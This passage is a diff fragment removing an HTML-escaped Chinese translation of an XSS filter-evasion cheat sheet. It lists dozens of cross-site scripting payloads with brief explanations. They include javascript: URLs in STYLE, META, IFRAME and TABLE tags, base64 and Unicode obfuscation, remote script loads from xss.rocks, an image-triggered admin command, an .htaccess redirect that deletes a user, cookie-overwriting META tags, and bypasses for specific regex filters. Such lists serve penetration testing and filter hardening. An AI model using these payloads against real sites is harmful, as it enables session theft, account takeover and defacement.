-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用背景的style标签&quot;&gt;使用背景的STYLE标签&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE type=&quot;text/css&quot;&amp;gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&amp;lt;/STYLE&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;含style属性的html任意标签&quot;&gt;含STYLE属性的HTML任意标签&lt;/h2&gt;
-
-&lt;p&gt;IE6.0和IE渲染引擎模式下的Netscape 8.1+并不关心你建立的HTML标签是否存在，只要是由尖括号和字母开始的即可:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;本地htc文件&quot;&gt;本地htc文件&lt;/h2&gt;
-
-&lt;p&gt;这和上面两个跨站脚本攻击向量有些不同，因为它使用了一个必须和XSS攻击向量在相同服务器上的.htc文件。这个示例文件通过下载JavaScript并将其作为style属性的一部分运行来进行攻击&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&amp;gt;     
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;us-ascii编码&quot;&gt;US-ASCII编码&lt;/h2&gt;
-
-&lt;p&gt;US-ASCII编码（由Kurt  Huwig发现）。它使用了畸形的7位ASCII编码来代替8位。这个XSS攻击向量可以绕过大多数内容过滤器，但是只在主机使用US-ASCII编码传输数据时有效，或者可以自己设置编码格式。相对绕过服务器端过滤，这在绕过WAF跨站脚本过滤时候更有效。Apache Tomcat是目前唯一已知使用US-ASCII编码传输的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;¼script¾alert(¢XSS¢)¼/script¾ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;meta&quot;&gt;META&lt;/h2&gt;
-
-&lt;p&gt;关于meta刷新比较奇怪的是它并不会在头部中发送一个referrer-所以它通常用于不需要referrer的时候:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用数据的meta&quot;&gt;&lt;strong&gt;使用数据的META&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;URL  scheme指令。这个非常有用因为它并不包含任何可见的SCRIPT单词或JavaScript指令,因为它使用了base64编码.请查看RFC  2397寻找更多细节。你同样可以使用具有Base64编码功能的XSS工具来编码HTML或JavaScript:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html 
-base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;含有额外url参数的meta&quot;&gt;&lt;strong&gt;含有额外URL参数的META&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;如果目标站点尝试检查URL是否包含”http://”，你可以用以下技术规避它(由Moritz Naumann提交):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;iframe&quot;&gt;IFRAME&lt;/h2&gt;
-
-&lt;p&gt;如果允许Iframe那就会有很多XSS问题:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;基于事件iframe&quot;&gt;基于事件IFRAME&lt;/h2&gt;
-
-&lt;p&gt;Iframes和大多数其他元素可以使用下列事件（由David Cross提交）:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;frame&quot;&gt;FRAME&lt;/h2&gt;
-
-&lt;p&gt;Frames和iframe一样有很多XSS问题:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;FRAMESET&amp;gt;&amp;lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;&amp;lt;/FRAMESET&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;table&quot;&gt;TABLE&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;td&quot;&gt;&lt;strong&gt;TD&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;和上面一样，TD也可以通过BACKGROUND来包含JavaScriptXSS攻击向量:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;TABLE&amp;gt;&amp;lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;div&quot;&gt;DIV&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image: url(javascript:alert('XSS'))&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;含有unicode-xss利用代码的div背景图像&quot;&gt;&lt;strong&gt;含有Unicode XSS利用代码的DIV背景图像&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;这进行了一些修改来混淆URL参数。原始的漏洞是由RenaudLifchitz在Hotmail发现的:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;含有额外字符的div背景图像&quot;&gt;&lt;strong&gt;含有额外字符的DIV背景图像&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;Rnaske进行了一个快速的XSS模糊测试来发现IE和安全模式下的Netscape  8.1中任何可以在左括号和JavaScript指令间加入的额外字符。这都是十进制的但是你也可以使用十六进制来填充（以下字符可用：1-32,  34, 39, 160, 8192-8.13, 12288, 65279）:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;DIV STYLE=&quot;background-image: url(&amp;amp;#1;javascript:alert('XSS'))&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;div表达式&quot;&gt;&lt;strong&gt;DIV表达式&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;一个非常有效的对抗现实中的跨站脚本过滤器的变体是在冒号和”expression”之间添加一个换行：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;DIV STYLE=&quot;width: expression(alert('XSS'));&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;html-条件选择注释块&quot;&gt;html 条件选择注释块&lt;/h2&gt;
-
-&lt;p&gt;只能在IE5.0及更高版本和IE渲染引擎模式下的Netscape  8.1生效。一些网站认为在注释中的任何内容都是安全的并且认为没有必要移除，这就允许我们添加跨站脚本攻击向量。系统会在一些内容周围尝试添加注释标签以便安全的渲染它们。如我们所见，这有时并不起作用：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;!--[if gte IE 4]&amp;gt;
-&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;
-&amp;lt;![endif]--&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;base标签&quot;&gt;BASE标签&lt;/h2&gt;
-
-&lt;p&gt;在IE和安全模式下的Netscape  8.1有效。你需要使用//来注释下个字符，这样你就不会造成JavaScript错误并且你的XSS标签可以被渲染。同样，这需要当前网站使用相对路径例如”images/image.jpg”来放置图像而不是绝对路径。如果路径以一个斜杠开头例如”/images/image.jpg”你可以从攻击向量中移除一个斜杠（只有在两个斜杠时注释才会生效）：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BASE HREF=&quot;javascript:alert('XSS');//&quot;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;object标签&quot;&gt;OBJECT标签&lt;/h2&gt;
-
-&lt;p&gt;如果允许使用OBJECT，你可以插入一个病毒攻击载荷来感染用户，类似于APPLET标签。链接文件实际是含有你XSS攻击代码的HTML文件:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://xss.rocks/scriptlet.html&quot;&amp;gt;&amp;lt;/OBJECT&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用embed标签加载含有xss的flash文件&quot;&gt;使用EMBED标签加载含有XSS的FLASH文件&lt;/h2&gt;
-
-&lt;p&gt;如果你添加了属性allowScriptAccess=”never”以及allownetworking=”internal”则可以减小风险（感谢Jonathan Vanasco提供的信息）:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw        IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&amp;gt;&amp;lt;/EMBED&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用embed-svg包含攻击向量&quot;&gt;使用EMBED SVG包含攻击向量&lt;/h2&gt;
-
-&lt;p&gt;该示例只在FireFox下有效，但是比上面的攻击向量在FireFox下好，因为不需要用户安装或启用FLASH。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw        IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&amp;gt;&amp;lt;/EMBED&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;在flash中使用actionscript混淆xss攻击向量&quot;&gt;在FLASH中使用ActionScript混淆XSS攻击向量&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;a=&quot;get&quot;;
-b=&quot;URL(\&quot;&quot;;
-c=&quot;javascript:&quot;;
-d=&quot;alert('XSS');\&quot;)&quot;;
-eval(a+b+c+d);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;cdata混淆的xml数据岛&quot;&gt;CDATA混淆的XML数据岛&lt;/h2&gt;
-
-&lt;p&gt;这个XSS攻击只在IE和使用IE渲染模式的Netscape 8.1下有效-攻击向量由Sec Consult在审计Yahoo时发现&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XML ID=&quot;xss&quot;&amp;gt;&amp;lt;I&amp;gt;&amp;lt;B&amp;gt;&amp;lt;IMG SRC=&quot;javas&amp;lt;!-- --&amp;gt;cript:alert('XSS')&quot;&amp;gt;&amp;lt;/B&amp;gt;&amp;lt;/I&amp;gt;&amp;lt;/XML&amp;gt;
-&amp;lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&amp;gt;&amp;lt;/SPAN&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用xml数据岛生成含内嵌javascript的本地xml文件&quot;&gt;使用XML数据岛生成含内嵌JavaScript的本地XML文件&lt;/h2&gt;
-
-&lt;p&gt;这和上面是一样的但是将来源替换为了包含跨站脚本攻击向量的本地XML文件（必须在同一服务器上）&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XML SRC=&quot;xsstest.xml&quot; ID=I&amp;gt;&amp;lt;/XML&amp;gt;
-&amp;lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&amp;gt;&amp;lt;/SPAN&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;xml中使用htmltime&quot;&gt;XML中使用HTML+TIME&lt;/h2&gt;
-
-&lt;p&gt;这是Grey Magic攻击Hotmail和Yahoo的方法。这只在IE和IE渲染模式下的Netscape8.1有效并且记得需要在HTML域的BODY标签中间才有效：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;HTML&amp;gt;&amp;lt;BODY&amp;gt;        
-&amp;lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&amp;gt;
-&amp;lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&amp;gt;
-&amp;lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;
-&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;使用一些字符绕过js过滤&quot;&gt;使用一些字符绕过”.js”过滤&lt;/h2&gt;
-
-&lt;p&gt;你可以将你的JavaScript文件重命名为图像来作为XSS攻击向量：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=&quot;http://xss.rocks/xss.jpg&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;ssi服务端脚本包含&quot;&gt;SSI（服务端脚本包含）&lt;/h2&gt;
-
-&lt;p&gt;这需要在服务器端允许SSI来使用XSS攻击向量。似乎不用提示这点，因为如果你可以在服务器端执行指令那一定是有更严重的问题存在：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;!--#exec cmd=&quot;/bin/echo '&amp;lt;SCR'&quot;--&amp;gt;&amp;lt;!--#exec cmd=&quot;/bin/echo 'IPT SRC=http://xss.rocks/xss.js&amp;gt;&amp;lt;/SCRIPT&amp;gt;'&quot;--&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;php&quot;&gt;PHP&lt;/h2&gt;
-
-&lt;p&gt;需要服务器端安装了PHP来使用XSS攻击向量。同样，如果你可以远程运行任意脚本，那会有更加严重的问题：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;? echo('&amp;lt;SCR)';
-echo('IPT&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/SCRIPT&amp;gt;'); ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;嵌入命令的image&quot;&gt;嵌入命令的IMAGE&lt;/h2&gt;
-
-&lt;p&gt;当页面受密码保护并且这个密码保护同样适用于相同域的不同页面时有效，这可以用来进行删除用户，增加用户（如果访问页面的是管理员的话），将密码发送到任意地方等等。。。这是一个较少使用当时更有价值的XSS攻击向量&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;嵌入命令的image-ii&quot;&gt;&lt;strong&gt;嵌入命令的IMAGE II&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;这更加可怕因为这不包含任何可疑标识，除了它不在你自己的域名上。这个攻击向量使用一个302或304（其他的也有效）来重定向图片到指定命令。所以一个普通的&lt;img src=&quot;httx://badguy.com/a.jpg&quot; /&gt;对于访问图片链接的用户来说也有可能是一个攻击向量。下面是利用.htaccess（Apache）配置文件来实现攻击向量。（感谢Timo提供这部分。）：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;amp;deleteuser
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;cookie篡改&quot;&gt;Cookie篡改&lt;/h2&gt;
-
-&lt;p&gt;尽管公认不太实用，但是还是可以发现一些允许使用META标签的情况下可用它来覆写cookie。另外的例子是当用户访问网站页面时，一些网站读取并显示存储在cookie中的用户名，而不是数据库中。当这两种场景结合时，你可以修改受害者的cookie以便将JavaScript注入到其页面中（你可以使用这个让用户登出或改变他们的用户状态，甚至可以让他们以你的账户登录）&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;&quot;&amp;gt;    
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;utf-7编码&quot;&gt;UTF-7编码&lt;/h2&gt;
-
-&lt;p&gt;如果存在XSS的页面没有提供页面编码头部，或者使用了任何设置为使用UTF-7编码的浏览器，就可以使用下列方式进行攻击（感谢Roman  Ivanov提供）。这在任何不改变编码类型的现代浏览器上是无效的，这也是为什么标记为完全不支持的原因。Watchfire在Google的自定义404脚本中发现这个问题：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;HEAD&amp;gt;&amp;lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&amp;gt; &amp;lt;/HEAD&amp;gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;利用html引号包含的xss&quot;&gt;利用HTML引号包含的XSS&lt;/h2&gt;
-
-&lt;p&gt;这在IE中测试通过，但还得视情况而定。它是为了绕过那些允许”&lt;script&gt;&quot;但是不允许&quot;&amp;lt;SCRIPT SRC...&quot;形式的正则过滤即&quot;/&amp;lt;script[^&amp;gt;]+src/i&quot;：&lt;/script&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这是为了绕过那些允许”&lt;script&gt;&quot;但是不允许&quot;&amp;lt;SCRIPTSRC...&quot;形式的正则过滤即&quot;  /&amp;lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|'(.)*?'|[^'&quot;&amp;gt;\s]+))?)+\s*|\s*)src/i&quot;（这很重要，因为在实际环境中出现过这种正则过滤）：&lt;/script&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT =&quot;&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;另一个绕过此正则过滤” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
-      &lt;td&gt;’(.)*?’&lt;/td&gt;
-      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
-      &lt;td&gt;\s*)src/i”的XSS：&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;&quot; '' SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;又一个绕过正则过滤”  /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
-      &lt;td&gt;’(.)*?’&lt;/td&gt;
-      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
-      &lt;td&gt;\s*)src/i”的XSS。尽管不想提及防御方法，但如果你想允许&lt;script&gt;标签但不加载远程脚本，针对这种XSS只能使用状态机去防御（当然如果允许&lt;script&gt;标签的话，还有其他方法绕过）&lt;/script&gt;&lt;/script&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT &quot;a='&amp;gt;'&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;最后一个绕过此正则过滤” /&amp;lt;script((\s+\w+(\s&lt;em&gt;=\s&lt;/em&gt;(?:”(.)*?”&lt;/td&gt;
-      &lt;td&gt;’(.)*?’&lt;/td&gt;
-      &lt;td&gt;[^’”&amp;gt;\s]+))?)+\s*&lt;/td&gt;
-      &lt;td&gt;\s*)src/i”的XSS，使用了重音符（在FireFox下无效）：&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=`&amp;gt;` SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这是一个XSS样例，用来绕过那些不会检查引号配对，而是发现任何引号就立即结束参数字符串的正则表达式：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT a=&quot;&amp;gt;'&amp;gt;&quot; SRC=&quot;httx://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;url字符绕过&quot;&gt;URL字符绕过&lt;/h2&gt;
-
-&lt;p&gt;假定”http://www.google.com/”是不被允许的：&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;IP代替域名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://66.102.7.147/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;   
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;URL编码&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;双字节编码&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://1113982867/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;十六进制编码&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;每个数字的允许的范围大概是240位字符，就如你在第二位上看到的，并且由于十六进制是在0到F之间，所以开头的0可以省略:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;八进制编码&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;又一次允许填充，尽管你必须保证每类在4位字符以上-例如A类，B类等等&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;  &amp;lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;混合编码&quot;&gt;&lt;strong&gt;混合编码&lt;/strong&gt;&lt;/h3&gt;
-
-&lt;p&gt;让我们混合基本编码并在其中插入一些TAB和换行，虽然不知道浏览器为什么允许这样做。TAB和换行只有被引号包含时才有效&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    &amp;lt;A HREF=&quot;h
-
-    tt	p://6	6.000146.0x7.147/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;协议解析绕过&lt;/strong&gt;&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;(// 替代http://可以节约很多字节).当输入空间有限时很有用(少两个字符可能解决大问题)  而且可以轻松绕过类似”(ht&lt;/td&gt;
-      &lt;td&gt;f)tp(s)?://”的正则过滤(感谢Ozh提供这部分).你也可以将”//”换成”\“。你需要保证斜杠在正确的位置，否则可能被当成相对路径URL:&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;//www.google.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能1&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Firefox使用Google的”feeling  lucky”功能根据用户输入的任何关键词来将用户重定向。如果你存在漏洞的页面在某些随机关键词上搜索引擎排名是第一的，你就可以利用这一特性来攻击FireFox用户。这使用了Firefox的”keyword:”协议。你可以像下面一样使用多个关键词”keyword:XSS+RSnake”。这在Firefox2.0后不再有效.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;//google&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
